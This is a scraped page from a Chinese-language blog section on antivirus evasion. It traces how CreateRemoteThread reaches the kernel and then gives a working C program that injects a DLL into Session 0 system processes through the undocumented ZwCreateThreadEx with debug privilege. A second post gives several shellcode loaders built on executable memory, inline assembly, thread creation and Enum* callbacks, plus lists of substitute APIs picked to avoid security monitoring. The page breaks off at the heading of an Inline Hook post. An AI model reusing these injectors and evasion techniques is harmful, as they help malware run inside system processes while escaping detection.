<h2 id="跟进函数"><a href="#跟进函数" class="headerlink" title="跟进函数"></a>跟进函数</h2><p>首先找到我们用DLL注入编译出来的二进制文件，看看CreateRemoteThread这个api到底是怎么调入进入0环的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111201711.png" alt="image-20240925111201711"></p>
<p>搜索到这个函数的位置之后，我们可以看见，CreateRemoteThread的引用指向了一个外部调用（<strong>粉字</strong>）</p>
<p>然后在导入表中查看，发现其来自Kernel32.dll</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111248448.png" alt="image-20240925111248448"></p>
<p>前面我们提到过，这个dll是一个相对基础的dll，在载入pdb之后，我们可以继续寻找CreateRemoteThread函数，下面的粉字意味着又是一个外部调用</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111338619.png" alt="image-20240925111338619"></p>
<p>我在自己跟这个调用的时候，发现这个api-ms-win-core-processthreads-l1-1-0.dll 库里面并没有实际的函数定义，反而是一些类似函数表头的数据结构，而且函数在导出表里面</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111433359.png" alt="image-20240925111433359"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111540902.png" alt="image-20240925111540902"></p>
<p>又查阅资料得知KERNEL32不一定是指kernel32.dll，在新版本中还有KernlBase.dll这个dll库和kernel32.dll库交替使用</p>
<p>在KernelBase中，果然找到了CreateRemoteThreadEx的函数</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111629601.png" alt="image-20240925111629601"></p>
<p>继续在这个函数中向下跟，在这个函数中也找到了NtCreateThreadEx的声明</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111746157.png" alt="image-20240925111746157"></p>
<p>Nt开头的函数，一看导入表，在ntdll中</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925111901191.png" alt="image-20240925111901191"></p>
<p>继续往下跟，在ntdll中找到了进入内核的入口</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925112041033.png" alt="image-20240925112041033"></p>
<p>在这个入口上，我们发现了ZwCreateThread，这也是另一个调用NtCreateThreadEx的入口</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925112115960.png" alt="image-20240925112115960"></p>
<p>在向系统进程注入DLL时，由于注入的是SESSION0的进程，CreateRemoteThread会调用更加底层的ZwCreateThreadEx这个函数，而ZwCreateThread第七个参数CreateThreadFlags会被置为1，<strong>导致线程创建完成后一直挂起导致无法恢复线程正常的运行</strong>，导致注入失败</p>
<p>这时候，<strong>我们可以使用更加底层的ZwCreateThread来解决这个问题</strong></p>
<p>ZwCreateThreadEx是一个未文档化的API，但是可以通过GetProcAddress来获取其地址</p>
<p>下面是这个API被逆向出来的结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">LPVOID lpParameter,</span></span><br><span class="line"><span class="params">ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">SIZE_T StackSize,</span></span><br><span class="line"><span class="params">SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">LPVOID lpParameter,</span></span><br><span class="line"><span class="params">BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">DWORD dwStackSize,</span></span><br><span class="line"><span class="params">DWORD dw1,</span></span><br><span class="line"><span class="params">DWORD dw2,</span></span><br><span class="line"><span class="params">LPVOID pUnkown)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.打开注入进程，获取进程句柄</span><br><span class="line">2.在注入的进程申请内存地址</span><br><span class="line">3.写入内存地址</span><br><span class="line">4.获取LoadLibraryA函数地址</span><br><span class="line">5.加载ntdll</span><br><span class="line">6.获取ZwCreateThreadEx函数地址</span><br><span class="line">7.使用 ZwCreateThreadEx 创建远线程，实现 DLL 注入</span><br><span class="line">8.关闭句柄</span><br></pre></td></tr></table></figure>

<p>在对Session0的注入需要拿到SE_PRIVILEGE_ENABLED权限，所以代码略有不同</p>
<p><strong>普通用户</strong></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925112515587.png" alt="image-20240925112515587"></p>
<p><strong>管理员</strong></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925112607677.png" alt="image-20240925112607677"></p>
<h2 id="demo（ascii）"><a href="#demo（ascii）" class="headerlink" title="demo（ascii）"></a>demo（ascii）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// session0Inject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">// 提权函数</span></span><br><span class="line">BOOL <span class="title function_">EnableDebugPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fOk = FALSE;</span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="keyword">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		fOk = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">ZwCreateThreadExInject</span><span class="params">(DWORD PID, <span class="type">const</span> <span class="type">char</span>* pszDllFileName)</span></span><br><span class="line">&#123;</span><br><span class="line">	EnableDebugPrivilege();</span><br><span class="line">	HANDLE hRemoteThread;</span><br><span class="line">	DWORD dwStatus = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess error : %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	SIZE_T dwSize = _tcslen(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line">	LPVOID pDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT,</span><br><span class="line">		PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pDllAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize,</span><br><span class="line">		<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HMODULE hNtdllDll = LoadLibrary(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hNtdllDll)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Load ntdll.dll error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>),</span><br><span class="line">		<span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">		PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">		ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">		LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">		HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">		LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">		LPVOID lpParameter,</span></span><br><span class="line"><span class="params">		ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">		SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">		SIZE_T StackSize,</span></span><br><span class="line"><span class="params">		SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">		LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">		PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">		ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">		LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">		HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">		LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">		LPVOID lpParameter,</span></span><br><span class="line"><span class="params">		BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">		DWORD dwStackSize,</span></span><br><span class="line"><span class="params">		DWORD dw1,</span></span><br><span class="line"><span class="params">		DWORD dw2,</span></span><br><span class="line"><span class="params">		LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	typedef_ZwCreateThreadEx ZwCreateThreadEx =</span><br><span class="line">		(typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>,</span><br><span class="line">		hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(hNtdllDll);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//DWORD dwPid;</span></span><br><span class="line">		<span class="comment">//sscanf(argv[1], &quot;%d&quot;, &amp;dwPid);</span></span><br><span class="line">		BOOL bRet = ZwCreateThreadExInject((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]);</span><br><span class="line">		<span class="comment">//BOOL bRet = ZwCreateThreadExInject(dwPid, argv[2]);</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">-1</span> == bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll failed\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll successfully\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage: %s PID &lt;DllPath&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Example: %s 520 C:\\test.dll\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Session%E6%B3%A8%E5%85%A5/" data-id="cm1zwlrfm0009u0v66x9z93n6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/shellcode demo" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/shellcode%20demo/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.558Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="shellcode-demo"><a href="#shellcode-demo" class="headerlink" title="shellcode demo"></a>shellcode demo</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc error : %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc successfully\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcpy</span>(p, buf, <span class="built_in">sizeof</span>(buf)))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Write shellcode failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Write shellcode successfully\n&quot;</span>);</span><br><span class="line">((<span class="built_in">void</span>(*)())p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span>* exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> buf, MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, buf, <span class="keyword">sizeof</span> buf);</span><br><span class="line">((<span class="type">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="汇编执行（x86）"><a href="#汇编执行（x86）" class="headerlink" title="汇编执行（x86）"></a>汇编执行（x86）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//增加可读可写可执行的内存权限</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">lea eax, buf;</span><br><span class="line">call eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建线程执行"><a href="#创建线程执行" class="headerlink" title="创建线程执行"></a>创建线程执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode⻓度</span></span><br><span class="line">DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">char</span>* shellcode = (<span class="type">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf),</span><br><span class="line">MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line">CopyMemory(shellcode, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)shellcode, <span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在免杀领域中</strong>，</p>
<p>类似 VirtualAlloc，CreateThread，WriteProcessMemory 这些api肯定是被重点监 控的，我们可以进行一些替换，比如 VirtualAlloc就可以换成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GlobalAlloc</span><br><span class="line">CoTaskMemAlloc</span><br><span class="line">HeapAlloc</span><br><span class="line">RtlCreateHeap</span><br><span class="line">AllocADsMem</span><br><span class="line">ReallocADsMem</span><br></pre></td></tr></table></figure>

<p>这些申请内存的api都可以尝试</p>
<p>创建线程可以换成回调函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">LPVOID address = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode),</span><br><span class="line">MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(address, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">HDC dc = GetDC(<span class="literal">NULL</span>);</span><br><span class="line">EnumFontsW(dc, <span class="literal">NULL</span>, (FONTENUMPROCW)address, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例替换</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> EnumTimeFormatsA</span><br><span class="line"><span class="number">2.</span> EnumWindows</span><br><span class="line"><span class="number">3.</span> EnumDesktopWindows</span><br><span class="line"><span class="number">4.</span> EnumDateFormatsA</span><br><span class="line"><span class="number">5.</span> EnumChildWindows</span><br><span class="line"><span class="number">6.</span> EnumThreadWindows</span><br><span class="line"><span class="number">7.</span> EnumSystemLocalesA</span><br><span class="line"><span class="number">8.</span> EnumSystemGeoID</span><br><span class="line"><span class="number">9.</span> EnumSystemLanguageGroupsA</span><br><span class="line"><span class="number">10.</span> EnumUILanguagesA</span><br><span class="line"><span class="number">11.</span> EnumSystemCodePagesA</span><br><span class="line"><span class="number">12.</span> EnumDesktopsW</span><br><span class="line"><span class="number">13.</span> EnumSystemCodePagesW</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/shellcode%20demo/" data-id="cm1zwlrfn000du0v6dka1bp8i" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Inline Hook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Inline%20Hook/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.556Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
